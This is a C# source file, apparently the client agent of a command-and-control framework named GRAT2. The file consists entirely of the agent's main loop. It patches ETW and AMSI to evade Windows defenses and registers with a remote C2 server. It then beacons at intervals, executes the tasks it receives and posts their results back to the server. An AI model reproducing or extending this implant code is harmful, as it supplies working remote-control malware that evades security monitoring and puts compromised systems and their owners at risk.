using System;


namespace GRAT2_Client.PInvoke
{
    class Program
    {
        static void Main(string[] args)
        {

            int i = 1;
            string receivedTask = "";
            string agentName = Config.RandomString(12);

            if (Config.sandboxEvasion)
            {
                _ = Config.patchEtw;
                _ = Config.patchAmsi;

                try
                {
                    Client.PostResults("", Config.c2 + Config.initialUrl, agentName); // initial agent
                    while (true)
                    {
                        if (i > 0)
                        {
                            System.Threading.Thread.Sleep(Config.sleep * 1000);
                            receivedTask = Client.GetRequest(Config.checker_url, agentName); // beaconing and tasking

                        }
                        i++;
                        string[] obfTasks = receivedTask.Split(' ');

                        if (!Tasks.ValidArguments.Contains(obfTasks[0]))
                        {
                            // do nothing
                        }
                        else
                        {
                            string results = Tasks.Run(obfTasks);

                            Client.PostResults(results, Config.c2 + Config.sendResults, agentName); // Post Results
                        }
                    }
                 }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);

                }
            }
        
        }
    }
}
